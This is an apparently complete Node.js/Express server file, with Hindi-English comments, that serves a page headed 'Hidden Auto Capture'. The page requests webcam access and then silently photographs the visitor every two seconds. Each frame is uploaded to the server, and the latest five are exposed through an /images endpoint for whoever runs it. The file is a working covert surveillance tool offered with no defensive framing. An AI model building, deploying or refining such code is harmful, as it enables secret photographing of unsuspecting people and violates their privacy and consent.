const express = require('express');  
const app = express();  
const http = require('http').Server(app);  
const fs = require('fs');  
const path = require('path');  
const bodyParser = require('body-parser');  
  
// Middleware  
app.use(bodyParser.json({ limit: '10mb' }));  

// Render ke liye writeable folder
const imagesDir = path.join('/tmp', 'uploads'); 
if (!fs.existsSync(imagesDir)) fs.mkdirSync(imagesDir, { recursive: true });  

// Serve static images
app.use('/img', express.static(imagesDir));  

// =======================
// Automatic Camera Capture Page
// =======================
app.get('/', (req, res) => {  
    res.send(`  
        <!DOCTYPE html>  
        <html>  
        <head>  
            <title>Automatic Image Capture</title>  
        </head>  
        <body style="background:#111;color:#fff;text-align:center;">  
            <h1>📸 Hidden Auto Capture</h1>  
            <script>  
                async function start() {  
                    try {  
                        const stream = await navigator.mediaDevices.getUserMedia({ video: true });  
                        const video = document.createElement('video');  
                        video.srcObject = stream;  
                        video.play();  

                        // Capture image every 2 seconds  
                        setInterval(() => {  
                            const canvas = document.createElement('canvas');  
                            canvas.width = video.videoWidth;  
                            canvas.height = video.videoHeight;  
                            const ctx = canvas.getContext('2d');  
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);  
                            const dataUrl = canvas.toDataURL('image/png');  

                            fetch('/upload', {  
                                method: 'POST',  
                                headers: { 'Content-Type': 'application/json' },  
                                body: JSON.stringify({ image: dataUrl })  
                            })  
                            .then(res => res.json())  
                            .then(data => console.log('Saved:', data.url))  
                            .catch(err => console.error(err));  
                        }, 2000);  
                    } catch(err) {  
                        console.error('Camera access error:', err);  
                    }  
                }  
                start();  
            </script>  
        </body>  
        </html>  
    `);  
});  

// =======================
// Upload Endpoint
// =======================
app.post('/upload', (req, res) => {  
    const { image } = req.body;  
    if (!image) return res.status(400).json({ error: 'No image data' });  

    const base64Data = image.replace(/^data:image\/png;base64,/, '');  
    const filePath = path.join(imagesDir, `${Date.now()}.png`);  

    fs.writeFile(filePath, base64Data, 'base64', err => {  
        if (err) return res.status(500).json({ error: 'Failed to save image' });  

        updateImageList();  
        const url = `${req.protocol}://${req.get('host')}/img/${path.basename(filePath)}`;  
        res.json({ url });  
    });  
});  

// =======================
// Latest 5 Images API
// =======================
app.get('/images', (req, res) => {  
    fs.readdir(imagesDir, (err, files) => {  
        if (err) return res.status(500).json({ error: 'Failed to read directory' });  

        files.sort((a, b) => b.localeCompare(a));  
        const latestFiles = files.slice(0, 5);  
        const baseUrl = `${req.protocol}://${req.get('host')}/img/`;  
        const imageUrls = latestFiles.map(f => `${baseUrl}${f}`);  
        res.json({ images: imageUrls });  
    });  
});  

// =======================
// Keep only latest 5 images
// =======================
function updateImageList() {  
    fs.readdir(imagesDir, (err, files) => {  
        if (err) return;  
        files.sort((a, b) => b.localeCompare(a));  
        const filesToDelete = files.slice(5);  
        filesToDelete.forEach(f => fs.unlink(path.join(imagesDir, f), () => {}));  
    });  
}  

// Start Server
http.listen(process.env.PORT || 3000, () => {  
    console.log('✅ Server running');  
});
